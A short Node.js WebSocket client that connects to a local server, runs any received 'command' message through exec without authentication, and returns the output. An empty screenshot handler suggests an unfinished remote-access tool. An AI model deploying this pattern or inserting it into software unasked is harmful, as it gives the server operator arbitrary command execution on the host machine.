const WebSocket = require('ws')
const {exec} = require('child_process')

const ws = new WebSocket('ws://localhost:3000')

ws.on('open', () => {
	console.log('Connected to server')
})

ws.on('message', (message) => {
	const data = JSON.parse(message)
    if (data.type === 'command') {
        exec(data.command, (error, stdout, stderr) => {
            if (error) return ws.send(JSON.stringify({ type: 'error', error: error.message }))
            ws.send(JSON.stringify({ type: 'result', stdout, stderr }))
        })
    } else if (data.type === 'screenshot') {
        
    }
})
